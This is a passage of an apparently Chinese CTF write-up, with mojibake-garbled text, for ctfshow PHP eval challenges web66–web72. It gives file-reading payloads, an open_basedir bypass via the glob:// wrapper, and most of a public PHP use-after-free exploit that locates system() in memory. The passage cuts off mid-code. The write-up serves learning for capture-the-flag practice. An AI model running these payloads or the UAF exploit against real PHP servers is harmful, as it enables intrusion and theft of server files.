ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒweb66  </p><p>å…ˆæŸ¥çœ‹æ ¹ç›®å½•ï¼Œæ‰“å¼€flag.txtæ–‡ä»¶</p><p><code>c=var_dump(scandir(&#39;.&#39;));</code></p><p><code>c=var_dump(scandir(&#39;/&#39;));</code></p><p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h3 id="web68"><a href="#web68" class="headerlink" title="web68:"></a>web68:</h3><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919193458852.png"></p><p> æ‰«ææ ¹ç›®å½•  <code>c=var_dump(scandir(&#39;/&#39;));</code></p><p>ç”¨include()å‡½æ•°è¯•ä¸€è¯•    <code>c=include(&#39;/flag.txt&#39;);echo $flag;</code></p><p><code>c=include(&#39;/flag.txt&#39;);</code>   æ²¡æœ‰PHPæ ‡ç­¾ï¼Œä½œä¸ºHTMLè‡ªåŠ¨è¾“å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919193949945.png"></p><h3 id="web69ï¼š"><a href="#web69ï¼š" class="headerlink" title="web69ï¼š"></a>web69ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919194416040.png"></p><p>åŒweb68ï¼Œç™½å«–   <code>c=include(&#39;/flag.txt&#39;);</code>  </p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919194744737.png" style="zoom: 50%;" /><h3 id="web70ï¼š"><a href="#web70ï¼š" class="headerlink" title="web70ï¼š"></a>web70ï¼š</h3><p>ç»§ç»­ç™½å«–     <code>c=include(&#39;/flag.txt&#39;);</code></p><h3 id="web71ï¼š"><a href="#web71ï¼š" class="headerlink" title="web71ï¼š"></a>web71ï¼š</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();   <span class="comment">//æ¸…ç©ºç¼“å†²åŒº</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);   <span class="comment">//æŠŠç¼“å†²åŒºçš„å†…å®¹è¿›è¡Œæ›¿æ¢ï¼Ÿ</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>é¢˜ç›®é™„ä»¶</p><h5 id="ob-get-contents-å‡½æ•°çš„ç”¨æ³•"><a href="#ob-get-contents-å‡½æ•°çš„ç”¨æ³•" class="headerlink" title="ob_get_contents()å‡½æ•°çš„ç”¨æ³•"></a>ob_get_contents()å‡½æ•°çš„ç”¨æ³•</h5><blockquote><p>ä½¿ç”¨ob_start()æŠŠè¾“å‡ºé‚£åŒè¾“å‡ºåˆ°ç¼“å†²åŒºï¼Œè€Œä¸æ˜¯åˆ°æµè§ˆå™¨ï¼›</p><p>ç„¶åç”¨ob_get_contentså¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®ï¼Œæ‰€ä»¥åœ¨ä»»ä½•æ—¶å€™ä½¿ç”¨echoï¼Œè¾“å‡ºéƒ½å°†è¢«åŠ å…¥ç¼“å†²åŒºä¸­ï¼Œç›´åˆ°ç¨‹åºè¿è¡Œç»“æŸæˆ–è€…ä½¿ç”¨ob_flush()æ¥ç»“æŸã€‚ç„¶ååœ¨æœåŠ¡å™¨ä¸­ç¼“å†²åŒºçš„å†…å®¹æ‰ä¼šå‘é€åˆ°æµè§ˆå™¨ï¼Œç”±æµè§ˆå™¨æ¥è§£ææ˜¾ç¤ºã€‚</p><p>å‡½æ•°ob_end_cleanä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹ã€‚<br>æ­¤æ—¶å¾—ç”¨ä¸€ä¸ªå‡½æ•°ob_get_contents()åœ¨ob_end_clean()å‰é¢æ¥è·å¾—ç¼“å†²åŒºçš„å†…å®¹ã€‚<br>è¿™æ ·çš„è¯ï¼Œèƒ½å°†åœ¨æ‰§è¡Œob_end_clean()å‰æŠŠå†…å®¹ä¿å­˜åˆ°ä¸€ä¸ªå˜é‡ä¸­ï¼Œç„¶ååœ¨ob_end_clean()åé¢å¯¹è¿™ä¸ªå˜é‡åšæ“ä½œã€‚</p></blockquote><h5 id="php-ini-set-â€˜display-errorsâ€™-value"><a href="#php-ini-set-â€˜display-errorsâ€™-value" class="headerlink" title="php ini_set(â€˜display_errorsâ€™, $value)"></a><a href="https://www.cnblogs.com/lin3615/p/3803842.html">php ini_set(â€˜display_errorsâ€™, $value)</a></h5><blockquote><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œåœ¨å¼€å‘æ¨¡å¼ä¸­ï¼ŒæŠŠé”™è¯¯æ˜¾ç¤ºå‡ºæ¥ï¼Œæ–¹ä¾¿çº æ­£ï¼Œä½†åœ¨å¸ƒç½²æ¨¡å¼ä¸­ï¼Œå°±å¾—æŠŠé”™è¯¯å…³é—­ï¼š</p><p>ini_set(â€˜display_errorsâ€™, 1); &#x2F;&#x2F; å¼€å¯</p><p>ini_set(â€˜display_errorsâ€™, 0); &#x2F;&#x2F; å…³é—­</p><p>æ­¤æ—¶ï¼Œåªæ˜¯å¯¹åŒ…å«åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­çš„æ–‡ä»¶æœ‰æ•ˆï¼Œæœ¬æ–‡ä»¶æ˜¯æ— æ•ˆæœçš„ï¼š</p><p>test.php</p><p>ini_set(â€˜display_errorsâ€™, 0);</p><p>include(â€˜hi.phpâ€™);</p><p>æ­¤æ—¶ï¼Œå¦‚æœ test.phpæœ‰é”™è¯¯è¿˜æ˜¯ä¼šæç¤ºï¼Œä½†æ˜¯å¦‚æœ hi.php æœ‰é”™è¯¯ï¼Œåˆ™ä¸æç¤º</p></blockquote><p>æœ¬é¢˜ä¸­çš„ini_set(â€˜display_errorsâ€™,0);     è¡¨ç¤ºä»£ç é”™è¯¯ä¸æç¤º</p><p>å‘½ä»¤æ‰§è¡Œï¼Œ</p><p>ç›´æ¥ä¸­æ–­ï¼Œä¸æ‰§è¡Œåé¢çš„å‘½ä»¤    <code>c=include(&#39;/flag.txt&#39;);exit();</code></p><h3 id="web72ï¼š"><a href="#web72ï¼š" class="headerlink" title="web72ï¼š"></a>web72ï¼š</h3><p>ä¸‹è½½é™„ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç›®å½•   <code>c=$a=scandir(&#39;/&#39;);exit();</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220922191216300.png"></p><h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir()"></a>open_basedir()</h4><p>open_basediræ˜¯php.iniçš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ä»¥è®©ç”¨æˆ·è®¿é—®çš„åŒºåŸŸé™åˆ¶åœ¨æŒ‡å®šæ–‡ä»¶ç›®å½•ä¸­</p><p>åœ¨open_basedirçš„æ–‡ä»¶è·¯å¾„ä¸­ï¼Œä½¿ç”¨<code>å†’å·:</code>ä½œä¸ºåˆ†éš”ç¬¦</p><p>eg:  open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;web&#x2F;:&#x2F;tmp&#x2F;:&#x2F;proc&#x2F;</p><p>åˆ©ç”¨globä¼ªåè®®ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220922162537772.png"></p><p>uafç»•è¿‡open_basediræ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, 